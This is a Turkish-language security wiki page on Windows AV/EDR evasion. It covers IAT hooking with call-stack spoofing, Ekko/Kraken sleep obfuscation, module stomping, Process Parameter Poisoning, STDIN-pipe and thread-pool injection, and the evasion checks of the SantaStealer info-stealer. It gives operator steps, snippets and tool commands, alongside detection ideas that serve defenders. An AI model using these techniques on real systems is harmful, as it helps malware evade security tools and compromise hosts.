> [!TIP]
> Bu tekniğin tek başına privilege escalation sağlamadığını unutmayın; admin hakları gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red team'ler, runtime evasion'ı C2 implantından çıkarıp hedef modülün kendisine taşıyabilir. Bunun için modülün Import Address Table'ı (IAT) hook'lanır ve seçili API'ler saldırganın kontrolündeki, konumdan bağımsız koda (PIC) yönlendirilir. Bu yöntem, evasion'ı birçok kitin sunduğu sınırlı API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de uygular.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob'u yerleştirin (önüne eklenmiş veya eşlik eden). PIC kendi kendine yeterli ve konumdan bağımsız olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR'ı tarayın ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper'larına yönlendirecek şekilde patch'leyin.
- Her PIC wrapper'ı gerçek API adresine tail-call yapmadan önce evasion tekniklerini uygular. Yaygın evasion teknikleri şunlardır:
  - Çağrı sırasında memory mask/unmask uygulama (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme), ardından çağrı sonrasında eski hâline getirme.
  - Call-stack spoofing: Zararsız görünen bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için, bir Aggressor script'inin (veya eşdeğerinin) Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebilmesi amacıyla bir arayüz dışa aktarın.

Burada neden IAT hooking?
- Hook'lanan import'u kullanan tüm kodlarda çalışır; tool kodunu değiştirmeyi veya belirli API'leri proxy'lemesi için Beacon'a güvenmeyi gerektirmez.
- Post-ex DLL'lerini kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanıza ve bu modüllerin API çağrılarına aynı masking/stack evasion tekniklerini uygulamanıza olanak tanır.
- CreateProcessA/W'i wrapper'layarak call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import ilk kez kullanılmadan önce uygulayın. TitanLdr/AceLdr gibi reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking yapılabildiğini gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch öncesinde yakaladığınız özgün IAT değerinden veya LdrGetProcedureAddress aracılığıyla çözümleyin.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları sahte bir çağrı zinciri oluşturur (benign modüllerdeki return address'lerle) ve ardından gerçek API'ye geçiş yapar.
- Bu, Beacon/BOF'ların hassas API'lere yaptığı canonical stack'leri bekleyen tespitleri atlatır.
- API prologue'una varmadan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- DLL yüklendiğinde PIC ve hook'ların otomatik olarak başlatılması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
- Beacon ve BOF'ların kod değişikliği olmadan aynı evasion path'ten şeffaf biçimde yararlanması için bir Aggressor script kullanarak hedef API'leri kaydedin.

Tespit/DFIR değerlendirmeleri
- IAT bütünlüğü: image dışı (heap/anon) adreslere çözümlenen girdiler; import pointer'larının düzenli olarak doğrulanması.
- Stack anomalileri: yüklü image'lara ait olmayan return address'ler; image dışı PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetrisi: işlem içinde IAT'e yapılan yazmalar, import thunk'larını değiştiren erken DllMain etkinliği, yükleme sırasında oluşturulan beklenmedik RX bölgeleri.
- Image-load evasion: LoadLibrary* hooking yapılıyorsa, bellek masking olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO aracılığıyla import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden özel bir resolver ile değiştirerek `ProcessImports()` **sırasında** import'ları hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendini serbest bıraktıktan sonra da varlığını sürdüren bir **resident PICO** (persistent PIC object) oluşturun.
- Loader'ın import resolver'ını üzerine yazan bir `setup_hooks()` fonksiyonu export edin (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook lookup kullanın. Hook varsa onu döndürün; yoksa gerçek `GetProcAddress` fonksiyonuna devredin.
- Hook hedeflerini link sırasında Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Hook, resident PICO'nun içinde bulunduğu için geçerliliğini korur.

Böylece yüklenen DLL'in code section'ını yükleme sonrasında patch'lemeden **import-time IAT redirection** sağlanır.

### Hedef PEB-walking kullandığında hook'lanabilir import'ları zorlama

Import-time hook'lar yalnızca fonksiyon hedefin IAT'inde gerçekten bulunuyorsa tetiklenir. Bir modül API'leri PEB-walk + hash ile çözümlüyorsa (import girdisi yoksa), gerçek bir import oluşturarak loader'ın `ProcessImports()` path'inin bunu görmesini sağlayın:

- Hash'lenmiş export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi oluşturur; böylece reflective loader import'ları çözümlerken araya girilebilir.

### `Sleep()` patch'lemeden Ekko tarzı sleep/idle obfuscation

`Sleep`'i patch'lemek yerine, implantın kullandığı **gerçek wait/IPC primitive'lerini** hook'layın (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Uzun beklemelerde, idle sırasında bellekteki image'ı şifreleyen Ekko tarzı bir obfuscation zincirinde çağrıyı sarmalayın:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` kullanarak `NtContinue`'ı hazırlanmış `CONTEXT` frame'leriyle çağıran bir callback dizisi planlayın.
- Tipik zincir (x64): image'ı `PAGE_READWRITE` olarak ayarlama → eşlenmiş image'ın tamamında `advapi32!SystemFunction032` ile RC4 şifreleme → engelleyici wait işlemini gerçekleştirme → RC4 ile şifreyi çözme → PE section'larını dolaşarak **section başına izinleri geri yükleme** → tamamlandığını bildirme.
- `RtlCaptureContext` bir `CONTEXT` şablonu sağlar; bunu birden fazla frame'e kopyalayın ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: Çağıranın image maskelenmiş durumdayken devam etmesi için uzun wait'lerde (örn. `WAIT_OBJECT_0`) “success” döndürün. Bu yöntem, idle aralıklarında modülü scanner'lardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Tespit fikirleri (telemetri tabanlı)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback'lerinin art arda görülmesi.
- Büyük, bitişik ve image boyutundaki buffer'larda `advapi32!SystemFunction032` kullanılması.
- Büyük aralığı kapsayan `VirtualProtect` çağrısının ardından özel section başına izin geri yüklemesi yapılması.

### Sleep-obfuscation gadget'ları için runtime CFG kaydı

CFG etkin hedeflerde `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump, gadget modülün CFG metadata'sında bulunmadığı için genellikle süreci `STATUS_STACK_BUFFER_OVERRUN` ile çökertir. Ekko/Kraken tarzı zincirlerin hardening uygulanmış süreçlerde çalışmasını sürdürmek için:<sup>[[30]](#references)</sup>

- Zincirin kullandığı her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklü image'ların (`ntdll`, `kernel32`, `advapi32`) içindeki adreslerde `MEMORY_RANGE_ENTRY`, **image base** adresinden başlamalı ve **image'ın tamamını** kapsamalıdır.
- Manuel olarak map edilmiş/PIC/stomp edilmiş bölgelerde bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak erişilen export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) ve indirect target olacak saldırgan denetimli executable section'ları da işaretleyin.

Böylece ROP/JOP tarzı sleep zincirleri, “yalnızca CFG olmayan süreçlerde çalışır” durumundan `explorer.exe`, browser'lar, `svchost.exe` ve `/guard:cf` ile derlenmiş diğer endpoint'lerde kullanılabilen bir primitive'e dönüşür.

### Uyuyan thread'ler için CET-safe stack spoofing

Tam `CONTEXT` değişimi gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş bir `Rip`, donanım shadow stack'iyle uyumlu olmalıdır. Sleep masking için daha güvenli bir yöntem:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread'i seçin ve `NtQueryInformationThread` aracılığıyla `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread'in gerçek TEB/TIB'ini yedekleyin.
- Uyuyan thread'in gerçek context'ini `GetThreadContext` ile yakalayın.
- Spoof context'ine yalnızca gerçek `Rip`'i kopyalayın; spoof edilmiş `Rsp`/stack state'i olduğu gibi bırakın.
- Sleep window boyunca, stack walker'ların meşru bir stack range içinde unwind etmesi için spoof thread'in `NT_TIB`'ini mevcut TEB'e kopyalayın.
- Wait tamamlandıktan sonra özgün TIB ve thread context'ini geri yükleyin.

Bu, CET ile uyumlu bir instruction pointer'ı korurken unwind doğrulamasında TEB stack metadata'sına güvenen EDR stack walker'larını yanıltır.

### Alternatif: APC tabanlı Kraken Mask

Timer-queue dispatch fazla imza bırakıyorsa, aynı sleep-encrypt-spoof-restore dizisi queued APC'ler kullanılarak suspended bir helper thread'den yürütülebilir:<sup>[[27]](#references)</sup>

- Entry point olarak `NtTestAlert` kullanan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile kuyruğa alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack'ini tüketmemek için zincir state'ini helper stack'i yerine heap üzerinde saklayın.
- Start event'ini atomik olarak işaretleyip bloklanmak için `NtSignalAndWaitForSingleObject` kullanın.
- TIB/context'i geri yüklemeden önce main thread'i suspend edin (`NtSuspendThread` → restore → `NtResumeThread`); böylece scanner'ın yarım kalmış bir stack'i yakalayabileceği race window daralır.

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını helper-thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Sleep, wait veya APC dispatch işlemlerinden kısa süre önce `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory` çağrılması.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` çevresinde `GetThreadContext`/`SetThreadContext` kullanılması.
- `NtQueryInformationThread` çağrısının ardından mevcut thread'in TEB/TIB stack sınırlarına doğrudan yazılması.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüller içindeki dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrar tekrar kullanılması.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine payload'ları **hedef süreçte zaten map edilmiş bir DLL'in `.text` section'ından** çalıştırır. Üzerine yazma hedefi, payload'ı süreçte hâlâ ihtiyaç duyulan code path'leri bozmadan barındırabilecek **yüklü, disk destekli bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere yapılan basit stomping kırılgandır: DLL uzak süreçte yüklü olmayabilir ve code region'ın çok küçük olması süreci çökertebilir. Daha güvenilir bir iş akışı:

1. Hedef süreç modüllerini listeleyin ve zaten yüklü DLL'lerden oluşan, yalnızca **adları içeren** bir include list tutun.
2. Önce payload'ı oluşturun ve **tam byte boyutunu** kaydedin.
3. Aday DLL'leri diskte tarayın ve PE section **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu, file size'dan daha önemlidir; çünkü executable section'ın **belleğe map edildiğindeki** boyutunu yansıtır.
4. **Export Address Table (EAT)**'i ayrıştırın ve stomp başlangıç offset'i olarak export edilmiş bir fonksiyonun RVA'sını seçin.
5. **Blast radius**'ı hesaplayın: payload seçilen fonksiyon sınırını aşarsa, bellekte arkasından gelen bitişik export'ların üzerine yazar.

Sahada görülen yaygın recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasyonel notlar
- `LoadLibrary` / beklenmeyen image load'ların telemetry'sinden kaçınmak için uzak process'te **zaten yüklenmiş** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'ler, thread oluşturulmadan önce veya sonra stomp edilmiş byte'lara erişebilir.
- Büyük implantlarda, buffer'ın tamamının injector source'unda doğru şekilde temsil edilmesi için shellcode embedding işlemini string literal'dan **byte-array/braced initializer** biçimine dönüştürmek çoğu zaman gerekir.

Tespit fikirleri
- Daha yaygın private RWX/RX allocation'lar yerine **image-backed executable page'lere** (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan uzak yazma işlemleri.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk byte'ları kısa süre önce değiştirilmiş meşru bir DLL export'u içinde çalışmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerini hedefleyen ve ardından thread oluşturulmasıyla devam eden şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write yolundan (`VirtualAllocEx` + `WriteProcessMemory`) kaçınan bir **process-injection / EDR-evasion** tekniğidir. Zaten çalışan bir hedefe byte kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini child process'e **kopyalayıp** `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklamasından yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poison edilebilir taşıyıcılar

Kullanışlı taşıyıcılar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Taşıyıcılarla ilgili pratik kısıtlamalar:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleğe** işaret etmelidir ve null terminator dahil **32,767 Unicode karakterle** sınırlıdır.
- `lpEnvironment`, fazladan bir `\0` ile sonlandırılan ardışık `NAME=VALUE\0` string'lerinden oluşan bir Unicode environment block olmalıdır.
- `lpReserved` resmi olarak ayrılmış olduğundan, `ShellInfo` eşlemesi istikrarlı ve belgelenmiş bir sözleşme olarak değil, uygulamaya özel bir ayrıntı olarak değerlendirilmelidir.

Bu yöntem, normal process oluşturma işlemini **payload-transfer primitive** hâline getirir. Operatör, child process'i saldırganın kontrolündeki başlangıç verileriyle oluşturur ve süreçler arası kopyalamayı Windows'un yapmasını sağlar.

### Remote write API'leri olmadan uzak arama akışı

Child oluşturulduktan sonra, kopyalanan buffer'ı **salt okunur** primitive'lerle bulun:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Uzak `PEB`'i okuyun
3. `PEB.ProcessParameters` öğesini izleyin
4. `RTL_USER_PROCESS_PARAMETERS` yapısını okuyun
5. Seçilen pointer'ı kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Asgari akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre buffer'ını yürütme

Kopyalanan parametre bölgesi genellikle `RW` olur, yani yürütülebilir değildir. Yaygın bir P3 zinciri şöyledir:

1. Süreci normal şekilde oluşturun (suspended olmadan)
2. Seçilen parametre sayfasını `NtProtectVirtualMemory` / `VirtualProtectEx` ile yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen ana iş parçacığı handle'ını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'i üzerine yazarak) ile yürütmeyi yönlendirin

Klasik thread hijacking iş akışlarından farklı olarak bu yöntem **`SuspendThread` / `ResumeThread` gerektirmez**; context, döndürülen ana iş parçacığı handle'ı üzerinde doğrudan değiştirilebilir.

Bu, injection için yaygın olarak izlenen birkaç API'nin kullanılmasını önler:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null byte sınırlaması ve aşamalı shellcode

Üç taşıyıcının tümü **string veya string benzeri veridir**, bu nedenle `0x00` içeren ham bir payload aktarım sırasında kesilir. Kullanışlı bir çözüm, çalışma zamanında sabit değerleri yeniden oluşturan ve ardından isteğe bağlı ikinci bir aşamayı yükleyen **null içermeyen bir ilk aşama** kullanmaktır.

Basit bir yöntem, XOR tabanlı sabit değer sentezidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Bu, ilk aşamanın taşınan parametreye null byte eklemeden stack üzerinde dizeler, API argümanları, DLL yolları veya ikinci aşama shellcode loader'ı oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- hedef stack'e dizeyi/buffer'ı push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` değerlerini sabitlere veya `RSP`'ye göre adreslenen işaretçilere ayarlamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

Ardından ikinci aşama stack'ten `PAGE_READWRITE` izinli bir allocation'a kopyalanabilir, `VirtualProtect` ile izinleri `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX allocation kullanmadan bu koda atlanabilir.

### Tespit fikirleri

Yazarların belirttiği etkili avlanma fırsatları:

- `VirtualProtectEx` / `NtProtectVirtualMemory` ile **process-parameter sayfalarını executable yapmak**
- bu izin değişikliğinin ardından `SetThreadContext` / `NtSetContextThread` çağrılması
- `PEB`'in ve ardından `RTL_USER_PROCESS_PARAMETERS`'ın uzak bellekten okunması
- süreç oluşturulurken alışılmadık derecede uzun / yüksek entropili `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, tek başına tam bir execution primitive değil, **süreçler arası aktarım tekniğidir**: kopyalanan parametrenin hâlâ execute iznine geçirilmesi ve bir execution redirection yöntemi gerekir.
- Yazarlar `RtlCreateProcessReflection` / Dirty Vanity tekniğini değerlendirmiş, ancak bu yöntem dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere ulaştığı için kullanmamıştır.

Thread description'lar üzerinden **mevcut** bir Windows sürecine payload göndermek ve ardından bekleyen thread'in dönüş adresini ele geçirmek için bkz. [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Etkileşimli bir console child, **payload aktarım primitive'i** olarak da kullanılabilir. Injector, child'ın standart girişini bir pipe'a yönlendirir ve bir marker'ın ardından shellcode gönderir. Console programı veriyi kendi özel belleğine okuduktan sonra injector bu buffer'ı bulur, executable yapar ve bir child thread'i bu buffer'a yönlendirir. Bu yöntem `VirtualAllocEx` ve `WriteProcessMemory` kullanımını önler; ancak genel bir EDR bypass değil, yine de process injection'dır.<sup>[[41]](#references)</sup>

"named-pipe" tanımına rağmen, referans uygulaması `CreatePipe` çağırır ve bu da **anonymous pipe** oluşturur. Windows, anonymous pipe'ları dahili olarak benzersiz adlı pipe nesneleriyle uygular; ancak PoC ne `\\.\pipe\<name>` yolunu seçer ne de `CreateNamedPipe` çağırır. Varsayılan bir security descriptor ile devralınabilir handle'lar oluşturur, okuma handle'ını `STARTUPINFO.hStdInput` alanına yerleştirir, `STARTF_USESTDHANDLES` değerini ayarlar ve handle inheritance etkin durumdayken yeni bir child başlatır. Dolayısıyla bu PoC, verilen console executable'ını başlatır; pipe'ını mevcut bir sürece bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Uygulama şu zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child'ın `STDIN` ve `STDOUT` akışları için anonymous pipe çiftleri oluşturur. Parent tarafındaki iki handle'da inheritance'ı devre dışı bırakır ve süreç oluşturulduktan sonra parent'taki child tarafı kopyalarını kapatır.
2. `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable'ı `CREATE_NEW_CONSOLE` ile başlatır. Child, yönlendirilmiş standart handle'ları devralır.
3. Tam `rawData` binary dizisini parent tarafındaki `STDIN` handle'ı üzerinden `WriteFile` ile gönderir. Console programı byte'ları tüketir ve kopyalarını kendi özel commit edilmiş bölgelerinden birinde bırakır.
4. Child'ın adres alanını `VirtualQueryEx` ile tarar, `ReadProcessMemory` ile olası `MEM_PRIVATE` bölgelerini okur ve `rawData`'nın başındaki marker'ı arar.
5. Bulunan buffer'ın izinlerini `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştirir.
6. Ana thread'i belirler, askıya alır, `NtSetContextThread` ile `RIP` değerini `found_address + 0x19` olarak ayarlar ve thread'i devam ettirir.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Sağlanan uygulama x64'e özgüdür: `CONTEXT.Rip` değerini değiştirir ve gömülü payload'ı x64 shellcode'dur. `rawData`, 25 baytlık bir işaretçiyle başlar; bu nedenle çalıştırılabilir baytlar onaltılık `0x19` ofsetinde başlar. Payload'ı değiştirirken bu düzeni koruyun veya işaretçiyi, arama vektörünü, dizi boyutunu ve çalıştırma ofsetini birlikte güncelleyin. Kaynak yorumları ayrıca `0x0A`, `0x0D` ve `0x1A` değerlerini bad character olarak listeler. Bu iş akışı, çocuğun token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük native yardımcılar ve payload derleme kalıpları için bkz. [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Shellcode kullanmadan thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty tarzı thread-pool injection yöntemini uyarlayarak mevcut bir hedef worker'ın enjekte edilmiş bir callback stub'ını çalıştırması yerine `LoadLibraryA` çağırmasını sağlar. Dispatch primitive'i, hedef havuzun I/O completion port'una kuyruğa alınan bir `TP_DIRECT` completion'dır. Bu yöntem process izinlerini aşmaz: PoC, `OpenProcess(PROCESS_ALL_ACCESS)` çağrısı yapar ve okunabilir/yazılabilir hedef belleğe, ayrıca çoğaltılabilir worker-factory ve completion-port handle'larına ihtiyaç duyar.<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64'te worker, stack üzerinde ayrılmış `TP_CALLBACK_INSTANCE`'a işaretçiyi ilk callback argümanı olan `RCX` üzerinden geçirir. `LoadLibraryA` bu işaretçiyi `LPCSTR` olarak yorumlar. Test edilen yolda `TppWorkerThread`, işaretçiyi `RSP+0x178` konumunda oluştururken bu nesneye yaptığı ilk olağan yazma işlemi `RSP+0x1d0` konumundadır. Bu nedenle, 0x58 baytlık öne sığan null sonlandırılmış bir DLL yolu, dispatch öncesinde üzerine yazılmadan nesnenin başlangıcında yer alabilir. Bu, belirli bir build'e özgü bir gözlemdir; belgelenmiş bir Windows ABI garantisi değildir.<sup>[[46]](#references)[[47]](#references)</sup>

Referans iş akışı:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` ile hedefin handle'larını listeleyin ve nesne türlerini sorgulayarak `TpWorkerFactory` olanları belirleyin. Bir worker-factory handle'ını çoğaltın ve `WorkerFactoryBasicInformation` sorgulayın; `StartParameter`, uzak `TP_POOL` değerini verir. `TotalWorkerCount == 0` olan factory'leri atlayın.
2. `TP_POOL.CompletionPort` değerini okuyun ve havuzun özel worker listesini dolaşın. Test edilen Windows 10 19045 x64 build'inde (`ntdll.dll 10.0.19041.4842`), listenin başı `pool+0x60` konumundadır; her bağlantı `worker+0x10` konumundadır; dolayısıyla `worker+0x38` konumundaki callback-instance slot'u `link+0x28` değerine eşittir. PoC; işaretçi hizalamasını, bağlantıların karşılıklılığını, havuz sahipliğini, sıfır olmayan thread ID'lerini, yinelenen düğümleri ve kararlı bir liste başını denetler.
3. Kuyruğa alınan completion herhangi bir worker tarafından tüketilebileceğinden, DLL yolunu bulunan **her** worker slot'una yazın. `Callback = LoadLibraryA` olan bir `TP_DIRECT`'i yazılabilir hedef belleğe yerleştirin. PoC, `VirtualAllocEx` yerine worker stack'inde `last_slot-0x500` konumunu kullanır; bu ofset deneyseldir ve etkin stack verileriyle çakışmamalıdır.
4. Hedef completion-port handle'ını çoğaltın ve `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` çağrısı yapın. Uzak `TP_DIRECT` adresi completion key'dir. Mevcut bir worker, üzerine yazılmış callback-instance işaretçisiyle `LoadLibraryA` çağırarak hedefin zaten erişebildiği bir DLL'i yükler.

PoC, hedef PID'yi (`DLLParty.exe <target_pid>`) alır ve `DLLParty.cpp` içinde sabit kodlanmış bir DLL yolu kullanır; x64 executable'ı derlemeden önce hedefin erişebileceği bir yol ayarlayın. Ayrıca kendi process'indeki `LoadLibraryA` adresini uzak callback olarak kullanır; bu nedenle adresin hedefte de geçerli olduğunu varsayar. Kod, yol uzunluğunu 0x58 baytlık önekle karşılaştırmaz veya dizide son öğeyi indekslemeden önce worker dolaşımının bir slot bulup bulmadığını denetlemez. Hedef build için özel ofsetleri, stack düzenini ve yazılabilir alanı yeniden doğrulayın. `CreateRemoteThreadEx`, shellcode ve `VirtualAllocEx` kullanılmaması, process'ler arası yazma işlemlerini veya DLL yükleme telemetrisini ortadan kaldırmaz.<sup>[[46]](#references)[[47]](#references)</sup>

## Dosyasız Kaçınma ve Kimlik Bilgisi Hırsızlığı için SantaStealer Tradecraft

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve kimlik bilgilerine erişimi tek bir iş akışında nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Klavye düzeni kontrolü ve sandbox gecikmesi

- Bir yapılandırma bayrağı (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini listeler. Kiril alfabesi kullanan bir düzen bulunursa örnek boş bir `CIS` işaretçisi bırakır ve stealer'ları çalıştırmadan sonlanır; böylece hariç tutulan yerel ayarlarda hiçbir zaman etkinleşmezken avlama için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- Variant A, süreç listesini dolaşır; her adı özel bir rolling checksum ile hash’ler ve sonucu debugger/sandbox’lara yönelik gömülü blocklist’lerle karşılaştırır. Bilgisayar adı üzerinde checksum işlemini tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
